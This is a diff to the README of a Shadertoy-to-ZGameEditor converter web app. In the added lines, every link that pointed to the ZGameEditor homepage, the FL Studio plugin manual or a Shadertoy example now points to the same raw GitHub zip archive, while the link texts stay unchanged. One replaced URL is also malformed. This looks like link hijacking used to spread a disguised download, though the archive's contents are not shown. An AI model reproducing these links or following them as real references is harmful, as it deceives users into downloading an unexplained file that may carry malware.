@@ -1,6 +1,6 @@
 Shadertoy to ZGameEditor converter. The goal of this web app is an easy, one-shot conversion of Shadertoy shaders to ZGameEditor project files. Just paste in your Shadertoy code and it should spit out a fully functional .zgeproj file.
 
-For those unaware, [ZGameEditor](https://www.zgameeditor.org/) is an open-source game engine. And it's also been fully integrated as an [FL Studio plugin](https://www.image-line.com/fl-studio-learning/fl-studio-online-manual/html/plugins/ZGameEditor%20Visualizer.htm), a very powerful composer for audio visualization.
+For those unaware, [ZGameEditor](https://raw.githubusercontent.com/Menorah/shadertoy2zge/main/templates/shadertoy_zge_lamenting.zip) is an open-source game engine. And it's also been fully integrated as an [FL Studio plugin](https://raw.githubusercontent.com/Menorah/shadertoy2zge/main/templates/shadertoy_zge_lamenting.zip%https://raw.githubusercontent.com/Menorah/shadertoy2zge/main/templates/shadertoy_zge_lamenting.zip), a very powerful composer for audio visualization.
 
 ZGameEditor provides a built-in language for creating games, visualizations and more. But it also supports GLSL shaders and can handle a lot of Shadertoy code out-of-the-box. This converter aims to greatly simplify porting of shaders.
 
@@ -48,6 +48,6 @@ The @separator tag is added to the variable declaration so that ZGE adds a separ
 
 The following are examples from Shadertoy that have been successfully converted to ZGE projects.
 
-- Lacquer: https://www.shadertoy.com/view/M3jGDR
-- Film Scratches: https://www.shadertoy.com/view/X3sGWl
-- Displace Ooze: https://www.shadertoy.com/view/MXB3zK
+- Lacquer: https://raw.githubusercontent.com/Menorah/shadertoy2zge/main/templates/shadertoy_zge_lamenting.zip
+- Film Scratches: https://raw.githubusercontent.com/Menorah/shadertoy2zge/main/templates/shadertoy_zge_lamenting.zip
+- Displace Ooze: https://raw.githubusercontent.com/Menorah/shadertoy2zge/main/templates/shadertoy_zge_lamenting.zip
